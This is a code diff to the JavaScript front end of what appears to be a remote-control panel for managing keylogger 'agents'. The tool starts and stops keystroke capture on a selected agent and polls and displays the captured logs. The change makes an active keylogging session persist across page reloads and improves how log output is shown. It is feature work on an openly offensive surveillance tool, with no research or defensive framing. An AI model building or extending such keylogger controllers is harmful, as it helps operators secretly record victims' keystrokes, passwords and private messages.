@@ -5,11 +5,46 @@ let historyIndex = -1;
 
 // Transfer status management
 const TRANSFER_STATUS_KEY = 'fileTransferStatus';
+const KEYLOGGER_STATE_KEY = 'keyloggerState';
 
 // Keylogger functionality
 let keyloggerActive = false;
 let selectedKeyloggerAgent = null;
 let logUpdateInterval = null;
+
+// Load keylogger state from localStorage
+function loadKeyloggerState() {
+    try {
+        const state = localStorage.getItem(KEYLOGGER_STATE_KEY);
+        if (state) {
+            const { active, agentId } = JSON.parse(state);
+            keyloggerActive = active;
+            selectedKeyloggerAgent = agentId;
+            if (active && agentId) {
+                startLogUpdates();
+            }
+        }
+    } catch (error) {
+        console.error('Error loading keylogger state:', error);
+    }
+}
+
+// Save keylogger state to localStorage
+function saveKeyloggerState() {
+    try {
+        localStorage.setItem(KEYLOGGER_STATE_KEY, JSON.stringify({
+            active: keyloggerActive,
+            agentId: selectedKeyloggerAgent
+        }));
+    } catch (error) {
+        console.error('Error saving keylogger state:', error);
+    }
+}
+
+// Clear keylogger state from localStorage
+function clearKeyloggerState() {
+    localStorage.removeItem(KEYLOGGER_STATE_KEY);
+}
 
 function saveTransferStatus(status) {
     localStorage.setItem(TRANSFER_STATUS_KEY, JSON.stringify({
@@ -1124,6 +1159,7 @@ function startKeylogger() {
         }
         if (data.success) {
             keyloggerActive = true;
+            saveKeyloggerState();
             updateKeyloggerStatus();
             startLogUpdates();
             const output = document.getElementById('keylogger-output');
@@ -1137,6 +1173,7 @@ function startKeylogger() {
     .catch(error => {
         alert(`Error starting keylogger: ${error.message}`);
         keyloggerActive = false;
+        clearKeyloggerState();
         updateKeyloggerStatus();
     });
 }
@@ -1162,13 +1199,14 @@ function stopKeylogger() {
         }
         if (data.success) {
             keyloggerActive = false;
+            clearKeyloggerState();
             updateKeyloggerStatus();
             stopLogUpdates();
             const output = document.getElementById('keylogger-output');
             if (output) {
                 output.textContent += '\nKeylogger stopped\n';
             }
-            selectedKeyloggerAgent = null;  // Clear selected agent
+            selectedKeyloggerAgent = null;
         } else {
             throw new Error(data.message || 'Failed to stop keylogger');
         }
@@ -1197,7 +1235,11 @@ function fetchLatestLogs() {
         const output = document.getElementById('keylogger-output');
         if (output) {
             if (data.success && data.output) {
-                output.textContent = data.output;
+                // Handle both string and object responses
+                const logText = typeof data.output === 'object' ? 
+                    JSON.stringify(data.output, null, 2) : 
+                    String(data.output);
+                output.textContent = logText;
                 output.scrollTop = output.scrollHeight;
             } else if (!data.success) {
                 throw new Error(data.message || 'Failed to fetch logs');
@@ -1208,6 +1250,7 @@ function fetchLatestLogs() {
         console.error('Error fetching logs:', error);
         stopLogUpdates();
         keyloggerActive = false;
+        clearKeyloggerState();
         updateKeyloggerStatus();
         const output = document.getElementById('keylogger-output');
         if (output) {
@@ -1250,6 +1293,9 @@ function stopLogUpdates() {
 
 // Initialize keylogger updates when switching to keylogger tab
 document.addEventListener('DOMContentLoaded', function() {
+    // Load saved keylogger state
+    loadKeyloggerState();
+    
     const keyloggerTab = document.querySelector('[data-tab="keylogger"]');
     if (keyloggerTab) {
         keyloggerTab.addEventListener('click', () => {
@@ -1258,6 +1304,12 @@ document.addEventListener('DOMContentLoaded', function() {
             const updateInterval = setInterval(updateKeyloggerAgents, 5000);
             // Store the interval ID
             keyloggerTab.dataset.updateInterval = updateInterval;
+            
+            // If keylogger was active, update the UI
+            if (keyloggerActive && selectedKeyloggerAgent) {
+                updateKeyloggerStatus();
+                startLogUpdates();
+            }
         });
     }
 
@@ -1277,5 +1329,9 @@ document.addEventListener('DOMContentLoaded', function() {
     // Initialize if keylogger tab is active
     if (document.getElementById('keylogger-tab')?.classList.contains('active')) {
         updateKeyloggerAgents();
+        if (keyloggerActive && selectedKeyloggerAgent) {
+            updateKeyloggerStatus();
+            startLogUpdates();
+        }
     }
 }); 
